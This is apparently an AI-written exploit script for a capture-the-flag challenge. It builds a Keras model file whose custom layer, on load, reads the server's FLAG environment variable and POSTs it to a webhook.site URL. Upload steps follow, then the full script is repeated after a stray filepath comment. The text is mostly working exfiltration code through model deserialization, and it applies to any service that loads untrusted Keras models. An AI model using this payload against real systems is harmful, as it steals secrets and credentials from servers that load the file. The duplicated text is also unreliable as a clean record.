import keras
import os

# Imports for the payload
import urllib.request
import json # Though not strictly needed for just headers, good for potential body data

# Define the malicious layer
class ExploitLayer(keras.layers.Layer):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        print("Executing payload in ExploitLayer.__init__")
        try:
            flag_value = os.environ.get('FLAG', 'FLAG_NOT_FOUND_IN_ENV')
            webhook_url = "https://webhook.site/9712595a-c95a-42c3-b053-426c3eeb26d4"

            headers = {
                'X-Flag': flag_value,
                'User-Agent': 'KerasExploit/1.0',
                # 'Content-Type': 'application/json' # Include if sending a JSON body
            }
            
            # You can send an empty body with POST or use GET
            # For simplicity, sending a POST request with the flag in headers
            req = urllib.request.Request(webhook_url, headers=headers, method='POST')
            
            # If you prefer a GET request (webhook.site accepts this for headers):
            # req = urllib.request.Request(f"{webhook_url}?flag_in_header=true", headers=headers, method='GET')


            print(f"Payload: Attempting to send flag '{flag_value}' to webhook: {webhook_url} with headers: {headers}")
            
            with urllib.request.urlopen(req, timeout=10) as response:
                print(f"Webhook response status: {response.status}")
                # print(f"Webhook response body: {response.read().decode()}") # Optional: log response
            print(f"Payload: Flag exfiltration attempt completed.")

        except Exception as e:
            error_message = f"Payload Error: {str(e)}"
            print(error_message)
            # Optionally, try to exfiltrate the error message to the webhook as well
            try:
                error_data = {'error': error_message, 'original_flag_attempt': flag_value if 'flag_value' in locals() else 'N/A'}
                error_payload_bytes = json.dumps(error_data).encode('utf-8')
                
                error_headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'KerasExploitError/1.0',
                    'X-Error-Report': 'true'
                }
                req_err = urllib.request.Request(webhook_url, data=error_payload_bytes, headers=error_headers, method='POST')
                with urllib.request.urlopen(req_err, timeout=10) as response:
                    print(f"Error report webhook response status: {response.status}")
            except Exception as e_webhook:
                print(f"Failed to send error to webhook: {e_webhook}")

    def call(self, inputs):
        return inputs # The actual layer operation doesn't matter for the exploit

    def get_config(self):
        # Required for saving and loading custom layers
        config = super().get_config()
        return config

    @classmethod
    def from_config(cls, config):
        # Required for saving and loading custom layers
        return cls(**config)

# Create a simple model using the functional API
inputs = keras.Input(shape=(10,)) # Example input shape
x = ExploitLayer()(inputs)
outputs = keras.layers.Dense(1)(x) # Add a simple output layer
model = keras.Model(inputs=inputs, outputs=outputs)

# Compile the model (optional, but good practice)
model.compile(optimizer='adam', loss='mse')

# Save the model in the .keras format
try:
    model.save("exploit.keras")
    print("\nMalicious model 'exploit.keras' created successfully.")
    print("Upload this file to the CTF challenge.")
    print(f"The flag will be sent to: https://webhook.site/9712595a-c95a-42c3-b053-426c3eeb26d4 as an 'X-Flag' header.")
except Exception as e:
    print(f"Error saving model: {e}")
    print("Make sure you have TensorFlow (or another Keras backend like JAX or PyTorch) and Keras installed.")
    print("The challenge likely uses keras==3.8.0 and a compatible backend (e.g., tensorflow).")
    print("You can typically install them with: pip install keras tensorflow")

```

**How to use:**

1.  Save the code above as `create_exploit_model.py` on your local machine.
2.  Make sure you have `keras` and a backend like `tensorflow` installed in your local Python environment:
    ```bash
    pip install keras tensorflow
    ```
    (Try to match versions from the challenge's `requirements.txt` if possible, e.g., `keras==3.8.0`).
3.  Run the script:
    ```bash
    python create_exploit_model.py
    ```
4.  This will generate a file named `exploit.keras`.
5.  Upload this `exploit.keras` file to the `/upload` endpoint of the CTF web application.
6.  Check your webhook page: `https://webhook.site/9712595a-c95a-42c3-b053-426c3eeb26d4`. You should see a request containing the `FLAG` in the `X-Flag` header.

This payload uses `urllib.request`, which is part of the Python standard library, making it more likely to work in the server environment where the Keras model is loaded. It sends a POST request to your webhook URL with the flag in the `X-Flag` custom header.# filepath: create_exploit_model.py
import keras
import os

# Imports for the payload
import urllib.request
import json # Though not strictly needed for just headers, good for potential body data

# Define the malicious layer
class ExploitLayer(keras.layers.Layer):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        print("Executing payload in ExploitLayer.__init__")
        try:
            flag_value = os.environ.get('FLAG', 'FLAG_NOT_FOUND_IN_ENV')
            webhook_url = "https://webhook.site/9712595a-c95a-42c3-b053-426c3eeb26d4"

            headers = {
                'X-Flag': flag_value,
                'User-Agent': 'KerasExploit/1.0',
                # 'Content-Type': 'application/json' # Include if sending a JSON body
            }
            
            # You can send an empty body with POST or use GET
            # For simplicity, sending a POST request with the flag in headers
            req = urllib.request.Request(webhook_url, headers=headers, method='POST')
            
            # If you prefer a GET request (webhook.site accepts this for headers):
            # req = urllib.request.Request(f"{webhook_url}?flag_in_header=true", headers=headers, method='GET')


            print(f"Payload: Attempting to send flag '{flag_value}' to webhook: {webhook_url} with headers: {headers}")
            
            with urllib.request.urlopen(req, timeout=10) as response:
                print(f"Webhook response status: {response.status}")
                # print(f"Webhook response body: {response.read().decode()}") # Optional: log response
            print(f"Payload: Flag exfiltration attempt completed.")

        except Exception as e:
            error_message = f"Payload Error: {str(e)}"
            print(error_message)
            # Optionally, try to exfiltrate the error message to the webhook as well
            try:
                error_data = {'error': error_message, 'original_flag_attempt': flag_value if 'flag_value' in locals() else 'N/A'}
                error_payload_bytes = json.dumps(error_data).encode('utf-8')
                
                error_headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'KerasExploitError/1.0',
                    'X-Error-Report': 'true'
                }
                req_err = urllib.request.Request(webhook_url, data=error_payload_bytes, headers=error_headers, method='POST')
                with urllib.request.urlopen(req_err, timeout=10) as response:
                    print(f"Error report webhook response status: {response.status}")
            except Exception as e_webhook:
                print(f"Failed to send error to webhook: {e_webhook}")

    def call(self, inputs):
        return inputs # The actual layer operation doesn't matter for the exploit

    def get_config(self):
        # Required for saving and loading custom layers
        config = super().get_config()
        return config

    @classmethod
    def from_config(cls, config):
        # Required for saving and loading custom layers
        return cls(**config)

# Create a simple model using the functional API
inputs = keras.Input(shape=(10,)) # Example input shape
x = ExploitLayer()(inputs)
outputs = keras.layers.Dense(1)(x) # Add a simple output layer
model = keras.Model(inputs=inputs, outputs=outputs)

# Compile the model (optional, but good practice)
model.compile(optimizer='adam', loss='mse')

# Save the model in the .keras format
try:
    model.save("exploit.keras")
    print("\nMalicious model 'exploit.keras' created successfully.")
    print("Upload this file to the CTF challenge.")
    print(f"The flag will be sent to: https://webhook.site/9712595a-c95a-42c3-b053-426c3eeb26d4 as an 'X-Flag' header.")
except Exception as e:
    print(f"Error saving model: {e}")
    print("Make sure you have TensorFlow (or another Keras backend like JAX or PyTorch) and Keras installed.")
    print("The challenge likely uses keras==3.8.0 and a compatible backend (e.g., tensorflow).")
    print("You can typically install them with: pip install keras tensorflow")